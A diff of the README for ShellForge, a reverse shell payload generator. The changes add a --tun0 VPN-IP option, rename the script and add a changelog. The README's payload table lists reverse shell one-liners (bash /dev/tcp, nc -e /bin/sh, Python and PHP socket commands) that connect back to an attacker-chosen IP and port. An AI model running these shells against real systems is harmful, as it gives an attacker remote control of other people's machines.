@@ -1,8 +1,7 @@
 # 🛠️ ShellForge — Payload Generator
+Author: @Certifa
+🐚 Tool: Reverse Shell Payload Generator
 
-> **Author:** [@Certifa](https://github.com/Certifa)
-> 🐚 Tool: Reverse Shell Payload Generator
-> 🧠 Inspired by Metasploit's style & CLI payload handling
 
 ---
 
@@ -17,6 +16,7 @@
 - Colorful Rich interface
 - ASCII banner & stylized UX
 - Auto-injected IP & PORT into payloads
+- --tun0 flag: Automatically detect your VPN IP address
 - Works fully offline
 
 ---
@@ -24,13 +24,19 @@
 ## 🚀 Usage
 
 ```bash
-python3 payloadgen.py <IP> <PORT>
+python3 shell.py <IP|--tun0> <PORT>
 ```
+---
 
 ### 🔍 Example
-
+Manual IP:
 ```bash
-python3 payloadgen.py 10.10.14.5 4444
+python3 shell.py 10.10.14.5 4444
+```
+
+Auto-detect tun0 VPN IP:
+```bash
+python3 shell.py --tun0 4444
 ```
 
 You will see a menu like:
@@ -49,12 +55,12 @@ Select an option and the ready-to-use payload will be printed.
 
 ## 🎯 Payload Types
 
-| Option | Language | Payload |
-|--------|----------|---------|
-| 1 | Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
-| 2 | Python | `python3 -c 'import os,socket,...'` |
-| 3 | Netcat | `nc IP PORT -e /bin/sh` |
-| 4 | PHP | `php -r '$sock=fsockopen("IP",PORT);exec(...)'` |
+| Option | Language | Payload                                           |
+| ------ | -------- | ------------------------------------------------- |
+| 1      | Bash     | `/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` |
+| 2      | Python   | `python3 -c 'import os,socket,...'`               |
+| 3      | Netcat   | `nc IP PORT -e /bin/sh`                           |
+| 4      | PHP      | `php -r '$sock=fsockopen("IP",PORT);exec(...)'`   |
 
 IP and PORT are automatically injected from the CLI.
 
@@ -69,6 +75,11 @@ IP and PORT are automatically injected from the CLI.
 ```bash
 pip install -r requirements.txt
 ```
+
+**Dependencies:**
+- rich — Rich terminal output
+- pyfiglet — ASCII art banner
+- netifaces — Network interface detection (for --tun0)
 
 ---
 
@@ -113,10 +124,24 @@ This project is licensed under the [MIT License](docs/mit.txt)
 
 - [Rich](https://github.com/Textualize/rich)
 - [PyFiglet](https://github.com/pwaller/pyfiglet)
-- Inspired by classic red teaming tools like Metasploit
+- [Netifaces](https://github.com/al45tair/netifaces)
 
 ---
 
 ## 🔗 Links
 
 - GitHub: [https://github.com/Certifa/shellforge](https://github.com/Certifa/shellforge)
+
+
+## ⚙️ Changelog
+v1.1
+
+- Added --tun0 flag to auto-detect VPN interface IP
+
+- Fixed Bash TCP payload with proper wrapper: /bin/bash -c '...'
+
+- Updated dependencies: added netifaces
+
+v1.0
+
+- Initial release
